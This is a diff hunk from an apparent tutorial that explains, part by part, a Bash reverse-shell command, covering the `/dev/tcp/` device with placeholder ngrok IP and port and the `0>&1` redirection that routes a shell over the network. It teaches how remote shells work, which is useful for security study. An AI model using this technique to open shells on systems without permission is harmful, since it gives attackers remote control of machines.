@@ -534,7 +534,7 @@ Let's break down what each part of the command does:
   Here's how this redirection works:  
   - `>&` combines the stdout (`1`) and stderr (`2`) streams.
  
-  - `/dev/tcp/<NGROK-IP-HERE>/<NGROK-PORT-HERE>` is a special device in Unix-like systems that allows Bash to open a TCP connection to `<NGROK-IP-HERE>` at `<NGROK-PORT-HERE>`.
+  - `/dev/tcp/` is a special device in Unix-like systems that allows Bash to open a TCP connection to `<NGROK-IP-HERE>` at `<NGROK-PORT-HERE>`.
  
 3. `0>&1`: Redirects stdin (file descriptor `0`) to the same place as stdout (file descriptor `1`). This ensures that all input and output from the Bash shell session are sent over the network connection established with NGROK.
 
